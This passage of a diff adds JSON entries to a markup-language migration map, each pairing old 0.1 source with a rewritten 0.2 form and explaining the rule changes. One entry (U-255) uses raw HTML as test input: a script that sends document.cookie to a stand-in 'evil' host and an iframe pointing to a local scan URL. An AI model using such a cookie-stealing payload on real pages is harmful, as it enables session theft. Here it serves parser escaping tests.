+      "to": "[^a]: note body\n\nSee [^a].\n\n- {% %}\n",
+      "meaning02": "C2-B-081 and C2-B-083 keep the item empty and resolve the footnote after its definition is moved to document scope. The same holds for a definition indented into a footnote body: `[^a]: first` then `  [^b]: second` defines `b` in 0.1, while in 0.2 the line continues the paragraph of note `a`, `<p>first\n[^b]: second`, so `[^b]` stays text and the second note is not written; a blank line and the definition at column 0 keep the 0.1 HTML.",
+      "toolEntry": "U-213",
+      "silent": true
+    },
+    {
+      "id": "U-214",
+      "kind": "rewrite",
+      "group": "measured table cell code boundaries",
+      "from": "| a `b | c d |\n",
+      "to": "| a `b | c d` |\n",
+      "meaning02": "C2-B-169 keeps the middle pipe inside the code span when the matching closing run is written before the final pipe.",
+      "toolEntry": "U-214",
+      "silent": true
+    },
+    {
+      "id": "U-215",
+      "kind": "rewrite",
+      "group": "measured opaque percent fence boundaries",
+      "from": ":: t\n%%%\na\n%%%\n: body\n",
+      "to": ":: t\n: body\n",
+      "meaning02": "C2-B-108, C2-B-110, and C2-B-112 keep the description body with its term after the invisible percent span is removed.",
+      "toolEntry": "U-215",
+      "silent": true
+    },
+    {
+      "id": "U-216",
+      "kind": "rewrite",
+      "group": "measured invisible brace comments",
+      "from": "{%%}![alt](x.png)\n",
+      "to": "![alt](x.png)\n",
+      "meaning02": "C2-I-036 and C2-B-147 let the image open as a block after an invisible comment before or after it is removed.",
+      "toolEntry": "U-216",
+      "silent": true
+    },
+    {
+      "id": "U-218",
+      "kind": "rewrite",
+      "group": "empty footnote body sentinel",
+      "from": "See[^f]\n\n[^f]: {empty}\n",
+      "to": "See[^f]\n\n[^f]: {% %}\n",
+      "meaning02": "C2-B-082 and C2-I-036 keep the footnote resolved with an empty body when an empty brace comment replaces the old sentinel.",
+      "toolEntry": "U-218",
+      "silent": true
+    },
+    {
+      "id": "U-219",
+      "kind": "report",
+      "group": "longer colon run closes shorter div",
+      "from": ":::\n::::\n",
+      "to": ":::\n::::\n",
+      "meaning02": "C2-B-109 closes the shorter div with the longer bare colon run. The old source opened a nested div, and a preserving spelling has not been verified.",
+      "toolEntry": "U-219",
+      "silent": true
+    },
+    {
+      "id": "U-221",
+      "kind": "report",
+      "group": "wrapped link or image title",
+      "from": "[a](/u \"t\nu\")\n",
+      "to": "[a](/u \"t\nu\")\n",
+      "meaning02": "The tail holds a line break and is no tail (C2-I-069), so the source is paragraph text.",
+      "toolEntry": "U-221",
+      "silent": true
+    },
+    {
+      "id": "U-222",
+      "kind": "rewrite",
+      "group": "div boundary at owning column",
+      "from": "- one\n ::: note\n b\n :::\n",
+      "to": "- one\n::: note\n b\n :::\n",
+      "meaning02": "C2-B-014, C2-B-025 and C2-B-076 place the div or follower outside its preceding item or description when written at column zero.",
+      "toolEntry": "U-222",
+      "silent": true
+    },
+    {
+      "id": "U-223",
+      "kind": "rewrite",
+      "group": "note-hosted description body column",
+      "from": "[^f]: :: t\n  : | a |\n ^ cap\n\n[^f]\n",
+      "to": "[^f]: :: t\n      : | a |\n^ cap\n\n[^f]\n",
+      "meaning02": "C2-B-087 and C2-B-076 keep the description body in the note while the dedented caret line remains outside it.",
+      "toolEntry": "U-223",
+      "silent": true
+    },
+    {
+      "id": "U-224",
+      "kind": "report",
+      "group": "percent fence at a container boundary",
+      "from": "- ::: box\n  %%%%\n%% j\n  x\n",
+      "to": "- ::: box\n  %%%%\n%% j\n  x\n",
+      "meaning02": "<ul>\n  <li>\n    <div class=\"box\">\n\n    </div>\n  </li>\n</ul>\n<p>x</p> A comment block in a container ends where a line falls outside that container (C2-B-111), so `%% j` at column 0 is a line comment of the document and `x` a paragraph after the list; 0.1 kept the later lines in the block and hid `x`. ` : d2` below a comment block in a description and `tail` below one in a note differ the same way. No rewrite is recorded; review.",
+      "toolEntry": "U-224",
+      "silent": true
+    },
+    {
+      "id": "U-225",
+      "kind": "escape",
+      "group": "caption caret followed by an empty comment",
+      "from": "![alt](u)\n^ %% hidden\n",
+      "to": "![alt](u)\n\\^ %% hidden\n",
+      "meaning02": "C2-B-147 and C2-B-197 read the escaped caret as literal paragraph text following the image.",
+      "toolEntry": "U-225",
+      "silent": true
+    },
+    {
+      "id": "U-226",
+      "kind": "rewrite",
+      "group": "display math line before a caption",
+      "from": "$$`x\n^ p\n",
+      "to": "$$`x`\n^ p\n",
+      "meaning02": "C2-B-147 and C2-B-198 attach the caption after the display math span closes on its line.",
+      "toolEntry": "U-226",
+      "silent": true
+    },
+    {
+      "id": "U-227",
+      "kind": "report",
+      "group": "percent run inside a multiline brace comment",
+      "from": "- {% a\n   %%%\n   z %}\nplain\n",
+      "to": "- {% a\n   \\%%%\n   z %}\nplain\n",
+      "meaning02": "<ul>\n  <li>{% a</li>\n</ul>\n<p>plain</p> C2-I-036 and C2-B-108 read the `%%%` line as a comment block opener, so the brace comment never closes and `plain` leaves the list. The escaped percent run keeps the line inside the brace comment and `plain` in the item, `<ul>\n  <li>plain</li>\n</ul>`, but 0.1 wrote a line feed at the start of the item text, `<li>` then a line feed and `plain`, and a line that holds only a comment takes its line break with it in 0.2 (C2-H-069, U-362), so no 0.2 source gives the 0.1 HTML exactly.",
+      "toolEntry": "U-227",
+      "silent": true
+    },
+    {
+      "id": "U-228",
+      "kind": "rewrite",
+      "group": "description sibling after a list item",
+      "from": ":: term\n: - a\n\n   > c\n",
+      "to": ":: term\n: - a\n\n > c\n",
+      "meaning02": "C2-B-069 and C2-B-076 place the quote at the description content column, outside the preceding list item.",
+      "toolEntry": "U-228",
+      "silent": true
+    },
+    {
+      "id": "U-229",
+      "kind": "rewrite",
+      "group": "note item follower at note content column",
+      "from": "[^f]: - :::::\n       :::::\n\n[^f]\n",
+      "to": "[^f]: - :::::\n      :::::\n\n[^f]\n",
+      "meaning02": "C2-B-076 and C2-B-081 place the follower outside the item and inside the note at the note content column.",
+      "toolEntry": "U-229",
+      "silent": true
+    },
+    {
+      "id": "U-230",
+      "kind": "rewrite",
+      "group": "conflicting ordered list start attribute",
+      "from": "{start=9}\n3. x\n",
+      "to": "3. x\n",
+      "meaning02": "C2-B-041 and C2-B-045 give the attribute precedence over the marker when both stand in 0.2 source.",
+      "toolEntry": "U-230",
+      "silent": true
+    },
+    {
+      "id": "U-232",
+      "kind": "rewrite",
+      "group": "table row after description body",
+      "from": ":: t\n: para\n | a |\n",
+      "to": ":: t\n: para\n| a |\n",
+      "meaning02": "C2-B-069 and C2-B-076 put the dedented table outside the description, preserving the 0.1 HTML.",
+      "toolEntry": "U-232",
+      "silent": true
+    },
+    {
+      "id": "U-233",
+      "kind": "rewrite",
+      "group": "literal curly quote for old smart quote direction",
+      "from": ":a:\"q\"\n:long-name:'q'\n",
+      "to": ":a:“q\"\n:long-name:‘q'\n",
+      "meaning02": "C2-I-035 and C2-I-104 keep literal curly quotes while the remaining ASCII quotes close their spans.",
+      "toolEntry": "U-233",
+      "silent": true
+    },
+    {
+      "id": "U-234",
+      "kind": "rewrite",
+      "group": "literal backslash run in unresolved reference",
+      "from": "[\\^][]",
+      "to": "[\\\\\\^][]",
+      "meaning02": "C2-I-079 and C2-I-085 fold an unresolved reference label; extra source backslashes retain the 0.1 literal output.",
+      "toolEntry": "U-234",
+      "silent": true
+    },
+    {
+      "id": "U-235",
+      "kind": "report",
+      "group": "nested item definition boundary",
+      "from": "* * [d]: u\n  :\n",
+      "to": "* * {% %}\n\n  :\n",
+      "meaning02": "C2-B-081 and C2-B-083 read the item-local definition as text. An empty comment keeps the old empty nested item, and a blank line keeps the colon outside it, `<ul>\n      <li></li>\n    </ul>\n    <p>:</p>`, but 0.1 wrote the colon bare, `</ul>\n    :`, and in 0.2 a paragraph after the first block of an item gets `<p>` (C2-H-034, U-019), so no 0.2 source gives the 0.1 HTML.",
+      "toolEntry": "U-235",
+      "silent": true
+    },
+    {
+      "id": "U-236",
+      "kind": "rewrite",
+      "group": "compound description sibling columns",
+      "from": ":: t\n :: u\n: d\n : e\n",
+      "to": ":: t\n:: u\n: d\n: e\n",
+      "meaning02": "C2-B-067 and C2-B-069 recognize sibling description marks at their owning column; a note-hosted quote likewise moves to the description sibling column.",
+      "toolEntry": "U-236",
+      "silent": true
+    },
+    {
+      "id": "U-237",
+      "kind": "rewrite",
+      "group": "nested item follower at outer content column",
+      "from": "- a\n  * w\n  1. v\n    - u\n",
+      "to": "- a\n  * w\n  1. v\n  - u\n",
+      "meaning02": "C2-B-015 and C2-B-076 place the follower list or text at the outer item content column.",
+      "toolEntry": "U-237",
+      "silent": true
+    },
+    {
+      "id": "U-238",
+      "kind": "report",
+      "group": "list hosted fence continuation closer",
+      "from": "- ```\n  x\n\n+\ntail\n",
+      "to": "- ```\n  x\n\n  ```\n  tail\n",
+      "meaning02": "C2-B-057 and C2-B-111 end the item before `+`. An explicit closer at the item content column keeps the blank code line and `tail` in the item, `<pre><code>x\n\n</code></pre>\n    <p>tail</p>`, but 0.1 wrote `tail` bare after the code block, and in 0.2 a paragraph after the first block of an item gets `<p>` (C2-H-034, U-019), so no 0.2 source gives the 0.1 HTML.",
+      "toolEntry": "U-238",
+      "silent": true
+    },
+    {
+      "id": "U-239",
+      "kind": "rewrite",
+      "group": "following fence outside description",
+      "from": ":: t\n: a\n\t```\n ```\n",
+      "to": ":: t\n: a\n\t```\n```\n",
+      "meaning02": "C2-B-072 and C2-B-078 put the second fence at the document column, preserving the 0.1 sibling code block.",
+      "toolEntry": "U-239",
+      "silent": true
+    },
+    {
+      "id": "U-240",
+      "kind": "report",
+      "group": "long language tag is accepted",
+      "from": "[a]{:abcdefgh} [b]{:abcdefghi}\n",
+      "to": "",
+      "meaning02": "C2-I-030 accepts the nine-character tag and writes lang=\"abcdefghi\" on the second span.",
+      "toolEntry": "U-240",
+      "silent": true
+    },
+    {
+      "id": "U-241",
+      "kind": "report",
+      "group": "hardbreak div changes unresolved reference fallback",
+      "from": "::: \\\n[a\nb][missing]\n:::\n",
+      "to": "",
+      "meaning02": "C2-A-068 writes the line ending inside the unresolved reference fallback as a hard break inside the hardbreak div.",
+      "toolEntry": "U-241",
+      "silent": true
+    },
+    {
+      "id": "U-242",
+      "kind": "rewrite",
+      "group": "indented fence run remains code content",
+      "from": "{.x\n.y}\n```\nwa\n> q\n  ```\n",
+      "to": "{.x\n.y}\n````\nwa\n> q\n  ```\n",
+      "meaning02": "C2-B-108 and C2-B-110 leave the indented run inside a four-backtick fence as code content.",
+      "toolEntry": "U-242",
+      "silent": true
+    },
+    {
+      "id": "U-243",
+      "kind": "report",
+      "group": "backtick fence run inside a multiline brace comment",
+      "from": "- {% a\n   ```\n   z %}\nplain\n",
+      "to": "- {% a\n   \\```\n   z %}\nplain\n",
+      "meaning02": "<ul>\n  <li>{% a\n    <pre><code>z %}\n</code></pre>\n  </li>\n</ul>\n<p>plain</p> C2-I-036 and C2-B-108 read the backtick line as a code fence opener, so the brace comment never closes and `plain` leaves the list. The escaped backtick keeps the line inside the brace comment and `plain` in the item, `<ul>\n  <li>plain</li>\n</ul>`, but 0.1 wrote a line feed at the start of the item text, `<li>` then a line feed and `plain`, and a line that holds only a comment takes its line break with it in 0.2 (C2-H-069, U-362), so no 0.2 source gives the 0.1 HTML exactly.",
+      "toolEntry": "U-243",
+      "silent": true
+    },
+    {
+      "id": "U-244",
+      "kind": "rewrite",
+      "group": "floating block attribute across a footnote definition",
+      "from": "{.a}\n[^f]: note\n\nVisible\n",
+      "to": "[^f]: note\n\n{.a}\nVisible\n",
+      "meaning02": "C2-B-082, C2-B-091, and C2-B-095 attach the attribute to the visible paragraph when it is written after the definition.",
+      "toolEntry": "U-244",
+      "silent": true
+    },
+    {
+      "id": "U-245",
+      "kind": "rewrite",
+      "group": "quoted list fence retains its blank code line",
+      "from": "> a\n>\n> 1. ```\n>    x\n>\n> y\n",
+      "to": "> a\n>\n> 1. ```\n>    x\n>\n>    ```\n> y\n",
+      "meaning02": "C2-B-108 and C2-B-110 keep the blank code line when the quoted list fence has an explicit closer.",
+      "toolEntry": "U-245",
+      "silent": true
+    },
+    {
+      "id": "U-246",
+      "kind": "rewrite",
+      "group": "unresolved footnote attribute and heading id",
+      "from": "x[^n]{#i}\n\n## {#i}\n",
+      "to": "x[^n]{\\#i}\n\n{#i}\n## \\{#i}\n",
+      "meaning02": "C2-I-087, C2-I-119, and C2-B-091 keep the unresolved footnote attribute literal while the heading receives its authored id from the line above.",
+      "toolEntry": "U-246",
+      "silent": true
+    },
+    {
+      "id": "U-247",
+      "kind": "rewrite",
+      "group": "table row outside preceding ordered item",
+      "from": "::: note\n10. para\n   | t |\n```\ncode\n::::\n:::\nafter *b*\n",
+      "to": "::: note\n10. para\n| t |\n```\ncode\n::::\n:::\nafter *b*\n",
+      "meaning02": "C2-B-025 and C2-B-026 put the table at the admonition column, outside the ordered item.",
+      "toolEntry": "U-247",
+      "silent": true
+    },
+    {
+      "id": "U-248",
+      "kind": "report",
+      "group": "rejected HTML control character is replaced",
+      "from": "cd\n",
+      "to": "",
+      "meaning02": "<p>c�d</p> C2-H-176 replaces a rejected control character such as U+007F, U+000B, or U+0085 with U+FFFD in HTML text; 0.1 wrote the character itself, `<p>c` U+007F `d</p>`. The example holds U+007F, since the map holds no escaped character and JSON has no unescaped U+000B.",
+      "toolEntry": "U-248",
+      "silent": true
+    },
+    {
+      "id": "U-249",
+      "kind": "report",
+      "group": "inline math class key is canonicalized",
+      "from": "$`a`{CLASS=c}\n",
+      "to": "",
+      "meaning02": "C2-H-009 and C2-H-013 write the structural class attribute with its canonical lowercase name on inline math.",
+      "toolEntry": "U-249",
+      "silent": true
+    },
+    {
+      "id": "U-250",
+      "kind": "rewrite",
+      "group": "note fence moved outside an empty list item",
+      "from": "x[^1]\n\n- [^1]: ```\n    code\n\nafter\n",
+      "to": "x[^1]\n\n- {% %}\n\n[^1]: ```\n      code\n\n      ```\nafter\n",
+      "meaning02": "C2-B-082, C2-B-108, and C2-B-110 resolve the note at document scope while the empty comment retains the list item.",
+      "toolEntry": "U-250",
+      "silent": true
+    },
+    {
+      "id": "U-251",
+      "kind": "report",
+      "group": "task item consumes a nested footnote definition",
+      "from": "[^n]: - [ ]  [^f]: x\n\nr[^n] [^f]\n",
+      "to": "",
+      "meaning02": "C2-B-046, C2-B-082, and C2-H-032 give the task item ownership of the nested definition and write task item HTML.",
+      "toolEntry": "U-251",
+      "silent": true
+    },
+    {
+      "id": "U-252",
+      "kind": "report",
+      "group": "task item changes nested description ownership",
+      "from": "- [x]   - :: term\n           : desc\n           :: next\n           : body\n",
+      "to": "",
+      "meaning02": "C2-B-046, C2-B-067, and C2-H-032 change ownership of the nested description and write task item HTML.",
+      "toolEntry": "U-252",
+      "silent": true
+    },
+    {
+      "id": "U-253",
+      "kind": "rewrite",
+      "group": "open div is closed before a footnote definition",
+      "from": ":::\nb[^1]\n\n[^1]: c",
+      "to": ":::\nb[^1]\n\n:::\n\n[^1]: c",
+      "meaning02": "C2-B-082 and C2-B-109 read the footnote definition at document scope after the explicit div closer.",
+      "toolEntry": "U-253",
+      "silent": true
+    },
+    {
+      "id": "U-254",
+      "kind": "report",
+      "group": "inline delimiter and comment ownership changes",
+      "from": "/{+a/{k=b+}\n or /x /*a %% b*/{.c} y\n",
+      "to": "",
+      "meaning02": "C2-I-023, C2-I-043, and C2-I-047 change delimiter pairing when an attribute opener or a line comment intervenes.",
+      "toolEntry": "U-254",
+      "silent": true
+    },
+    {
+      "id": "U-255",
+      "kind": "report",
+      "group": "slash delimiters pair across escaped HTML tags",
+      "from": "<iframe src=\"http://localhost:8080/scan\"></iframe>\n<script>fetch(\"//evil/?\" + document.cookie)</script>\n",
+      "to": "",
+      "meaning02": "C2-I-047 pairs slash delimiters at a different boundary after raw HTML is escaped.",
+      "toolEntry": "U-255",
+      "silent": true
+    },
+    {
+      "id": "U-256",
+      "kind": "rewrite",
+      "group": "tag inside a failed brace attribute",
+      "from": "# H {#id .cls}\n",
+      "to": "# H {#id .cls\\}\n",
+      "meaning02": "C2-I-119 and C2-I-090 keep the tag visible when a failed brace attribute has its opening or closing brace escaped.",
+      "toolEntry": "U-256",
+      "silent": true
+    },
+    {
+      "id": "U-258",
+      "kind": "rewrite",
+      "group": "rulings of 16 November",
+      "from": "a `b c\n",
+      "to": "a `b c`\n",
+      "meaning02": "C2-I-017 reads a backtick run with no closer of its length as text; a closing run where the 0.1 code ended keeps <p>a <code>b c</code></p>, with one space before it when the value ends with a backtick (C2-W-077). An empty unclosed math run is U-396, an empty literal-text run U-440, and a value no span spells U-439.",
+      "toolEntry": "U-258",
+      "silent": true
+    },
+    {
+      "id": "U-259",
+      "kind": "rewrite",
+      "group": "rulings of 16 November",
+      "from": "|= ^|\n",
+      "to": "|= |\n",
+      "meaning02": "C2-B-173 and C2-B-174 make a span mark that cannot join the text of its cell; an empty cell keeps the 0.1 <th scope=\"col\"></th>.",
+      "toolEntry": "U-259",
+      "silent": false
+    },
+    {
+      "id": "U-262",
+      "kind": "report",
+      "group": "third review",
+      "from": "[t]{data-carve-raw=html}\n",
+      "to": "",
+      "meaning02": "<p><span>t</span></p> C2-H-116: an authored attribute with a reserved carrier name is dropped with `roundtrip` on or off, and `carrier-attribute-dropped` reports it.",
+      "toolEntry": "U-262",
+      "silent": true
+    },
+    {
+      "id": "U-263",
+      "kind": "report",
+      "group": "third review",
+      "from": "::: \\\n> a\n> b\n:::\n",
+      "to": "",
+      "meaning02": "<div class=\"hardbreaks\">\n  <blockquote><p>a<br>\nb</p></blockquote>\n</div> C2-A-068: every line end in the block is a hard break, also in a nested quote, item, description, admonition or caption; 0.1 broke only the lines of its direct paragraphs. `{.hardbreaks}` on a div gives the same block.",
+      "toolEntry": "U-263",
+      "silent": true
+    },
+    {
+      "id": "U-264",
+      "kind": "report",
+      "group": "third review",
+      "from": "::: |\n*Roses are red\nViolets are blue*\n:::\n",
+      "to": "::: |\n*Roses are red*\n*Violets are blue*\n:::\n",
+      "meaning02": "<div class=\"line-block\">\n  <p>*Roses are red<br>\nViolets are blue*</p>\n</div> Inline content is read in each line of a line block on its own (syntax-inline.md, Preliminaries), so a span across two lines is text. The rewrite closes and reopens the span on each line, which gives two strong spans instead of one.",
+      "toolEntry": "U-264",
+      "silent": true
+    },
+    {
+      "id": "U-265",
+      "kind": "none",
+      "group": "third review",
+      "from": "::: |\nRoses  are red\n:::\n",
+      "to": "::: |\nRoses  are red\n:::\n",
+      "meaning02": "<div class=\"line-block\">\n  <p>Roses&nbsp;&nbsp;are red</p>\n</div> C2-H-043 writes a run of two or more spaces inside a line as `&nbsp;`, one per space, as 0.1 did (ruling on #6762).",
+      "toolEntry": "U-265",
+      "silent": false
+    },
+    {
+      "id": "U-267",
+      "kind": "rewrite",
+      "group": "third review",
+      "from": "an _a=b_ word\n",
+      "to": "an {_a\\=b_} word\n",
+      "meaning02": "<p>an _a=b_ word</p> The U-065 rewrite `{_a=b_}` is a valid attribute block with the key `_a` (C2-I-043, C2-I-030) and renders as text. Escaping the equals sign keeps the underline.",
+      "toolEntry": "U-267",
+      "silent": true
+    },
+    {
+      "id": "U-269",
+      "kind": "rewrite",
+      "group": "rulings of 17 November",
+      "from": "|= A |={>^} < |\n| a | b |\n",
+      "to": "|= A |= < |\n| a |{>^} b |\n",
+      "meaning02": "<table>\n  <thead>\n    <tr><th colspan=\"2\" scope=\"col\">A</th></tr>\n  </thead>\n  <tbody>\n    <tr><td>a</td><td>b</td></tr>\n  </tbody>\n</table> C2-B-174: the brace block of a span mark that joins is kept for nothing, and `table-span-marker-attribute` reports it, on both axes.",
+      "toolEntry": "U-269",
+      "silent": false
+    },
+    {
+      "id": "U-271",
+      "kind": "report",
+      "group": "rulings of 17 November",
+      "from": "{body-rows=1 body-header-rows=1}\n| a |\n| b |\n",
+      "to": "",
+      "meaning02": "<table>\n  <tbody>\n    <tr><th scope=\"row\">a</th></tr>\n    <tr><td>b</td></tr>\n  </tbody>\n</table> C2-B-230, C2-H-056: a header row inside a body holds header cells, which take `scope=\"row\"` as every header cell outside the head; 0.1 wrote `scope=\"col\"`. A pipe table with `body-rows` keeps the head its header marks give (C2-B-178), where 0.1 made no head; write the head with header marks in place of `header-rows` (U-058).",
+      "toolEntry": "U-271",
+      "silent": true
+    },
+    {
+      "id": "U-273",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "/This /does not/ nest/\n",
+      "to": "/This \\/does not/ nest\\/\n",
+      "meaning02": "<p><em>This <em>does not</em> nest</em></p> C2-I-051 pushes a delimiter that can open also while an entry of its kind is open, so a kind nests in itself; 0.1 kept a bare delimiter of a kind already open as text. Escaping each delimiter that 0.1 kept as text keeps the 0.1 HTML.",
+      "toolEntry": "U-273",
+      "silent": true
+    },
+    {
+      "id": "U-274",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "{*a *b* c*}\n",
+      "to": "{*a \\*b\\* c*}\n",
+      "meaning02": "<p><strong>a <strong>b</strong> c</strong></p> Inside a braced span a bare pair of the same kind nests (C2-I-051, C2-I-059); 0.1 kept a bare child of an open braced kind as text. Escaping the inner delimiters keeps the 0.1 HTML.",
+      "toolEntry": "U-274",
+      "silent": true
+    },
+    {
+      "id": "U-275",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "a {#id} b\n",
+      "to": "a \\{#id} b\n",
+      "meaning02": "<p>a {#id} b</p> C2-I-035 and C2-I-036 make a valid attribute block that attaches to nothing one literal atom, so the tag inside it is text; 0.1 read `#id` inside the braces as a tag. An escaped opening brace keeps the 0.1 HTML. The same atom is why `{k=\"\"}x` keeps its straight quotes, `<p>{k=\"\"}x</p>` where 0.1 wrote `{k=““}x`, and why `{title=\"[a\"}](u)` forms no link, where 0.1 paired the bracket inside the value with `](u)`, `<p>{title=“<a href=\"u\">a”}</a></p>`; the escaped opening brace keeps the 0.1 HTML of both.",
+      "toolEntry": "U-275",
+      "silent": true
+    },
+    {
+      "id": "U-276",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "::: note \"Title\"\t[First]\nx\n:::\n",
+      "to": "::: note\nx\n:::\n",
+      "meaning02": "<aside class=\"admonition note\" aria-labelledby=\"adm-1\">\n  <p class=\"admonition-title\" id=\"adm-1\">Title</p>\n  <p>x</p>\n</aside> Only spaces separate the parts of an opener (C2-B-119), so the title before the tab is kept and the label behind it is further words, reported by `fence-title-syntax` (C2-B-122); 0.1 dropped the title and the label when a tab stood between them. Removing both keeps the 0.1 HTML.",
+      "toolEntry": "U-276",
+      "silent": true
+    },
+    {
+      "id": "U-277",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "```js \"T\"\t[L]\nx\n```\n",
+      "to": "```js\nx\n```\n",
+      "meaning02": "<pre title=\"T\"><code class=\"language-js\">x\n</code></pre> The quoted title before a tab or before further words stays the title (C2-B-117, C2-B-120, C2-B-122); 0.1 dropped it, after a tab and after a further word, as in ```` ```js \"T\" junk ````. Removing the title keeps the 0.1 HTML.",
+      "toolEntry": "U-277",
+      "silent": true
+    },
+    {
+      "id": "U-278",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "```\tjs\nx\n```\n",
+      "to": "``\tjs\nx``\n```\n",
+      "meaning02": "<pre><code>x\n</code></pre> A backtick run of three or more opens a code fence whatever follows it (C2-B-108, C2-B-122); a tab or a second space behind the run, a brace block or a character outside the language word is reported. 0.1 read the line as paragraph text with an unclosed code span, and the closer line as an empty code block. A two-backtick span closed at the end of the paragraph keeps the 0.1 HTML.",
+      "toolEntry": "U-278",
+      "silent": true
+    },
+    {
+      "id": "U-279",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": "|x|\n^ a\n  - b\n",
+      "to": "",
+      "meaning02": "<table>\n  <caption>a\n- b</caption>\n  <tbody>\n    <tr><td>x</td></tr>\n  </tbody>\n</table> C2-B-146 and C2-I-002 drop the indent of a continuation line of a caption and the spaces and tabs behind the caption mark's spaces; 0.1 kept both in the caption text. Escaped spaces give no-break spaces, not the 0.1 text, and a tab has no escape.",
+      "toolEntry": "U-279",
+      "silent": true
+    },
+    {
+      "id": "U-280",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "[t][a\tb]\n\n[a b]: /u\n",
+      "to": "[t]\\[a\tb]\n\n[a b]: /u\n",
+      "meaning02": "<p><a href=\"/u\">t</a></p> C2-I-079 folds every run of spaces, tabs and one line break in a label to one space, so a tab inside a reference label finds the definition with a space; 0.1 folded only spaces, so the reference stayed text. An escaped opening bracket of the label keeps the 0.1 HTML. U-160 records the same for a footnote label. The heading lookup folds the heading's plain text the same way (C2-I-084): below `# A`, a tab, `B`, the reference `[A B][]` links to the heading, where 0.1 kept it as text; `\\[A B][]` keeps the 0.1 HTML.",
+      "toolEntry": "U-280",
+      "silent": true
+    },
+    {
+      "id": "U-281",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "> # Quoted\n\n[Quoted][]\n",
+      "to": "> # Quoted\n\n\\[Quoted][]\n",
+      "meaning02": "<blockquote>\n  <h1 id=\"Quoted\">Quoted</h1>\n</blockquote>\n<p><a href=\"#Quoted\">Quoted</a></p> The heading lookup takes the first heading in document order with an id (C2-I-084), a heading inside a quote included; 0.1 left out every heading with a quote ancestor, so the reference stayed text. An escaped opening bracket keeps the 0.1 HTML. A cross-reference `</#Quoted>` resolved in both.",
+      "toolEntry": "U-281",
+      "silent": true
+    },
+    {
+      "id": "U-282",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": "{class=\"\"}\np\n",
+      "to": "",
+      "meaning02": "<p>p</p> The value of a `class` key is split at runs of spaces and tabs and an empty value adds no class (C2-I-042), so no element gets `class=\"\"`; 0.1 wrote the value as authored, also `class=\" \"`. No 0.2 source writes an empty `class` attribute.",
+      "toolEntry": "U-282",
+      "silent": true
+    },
+    {
+      "id": "U-283",
+      "kind": "report",
+      "group": "differences that stay",
+      "from": "[x](/u){rel=\"\"}\n",
+      "to": "",
+      "meaning02": "<p><a href=\"/u\">x</a></p> A link carries no `rel` when neither the author nor the profile gives a word (C2-H-167); 0.1 wrote `rel=\"\"` as authored. No 0.2 source writes an empty `rel` attribute.",
+      "toolEntry": "U-283",
+      "silent": true
+    },
+    {
+      "id": "U-284",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "[t](u v)\n",
+      "to": "\\[t](u v)\n",
+      "meaning02": "<p><a href=\"u v\">t</a></p> Whitespace is a space, a tab or a line break, so a no-break space (U+202F or U+00A0) inside a destination is part of it (C2-I-067); 0.1 excluded every Unicode whitespace character from a destination, so the source stayed text. An escaped opening bracket keeps the 0.1 HTML.",
+      "toolEntry": "U-284",
+      "silent": true
+    },
+    {
+      "id": "U-285",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "[a]:  /u\n\n[a][]\n",
+      "to": "\\[a]:  /u\n\n[a][]\n",
+      "meaning02": "<p><a href=\" /u\">a</a></p> A narrow no-break space after the space of a link definition starts its destination (C2-B-083, C2-I-067), so the line is a definition and the reference resolves; in 0.1 the line was text and the reference stayed literal. An escaped opening bracket keeps the 0.1 HTML.",
+      "toolEntry": "U-285",
+      "silent": true
+    },
+    {
+      "id": "U-286",
+      "kind": "rewrite",
+      "group": "differences that stay",
+      "from": "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[x]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]{.a}\n",
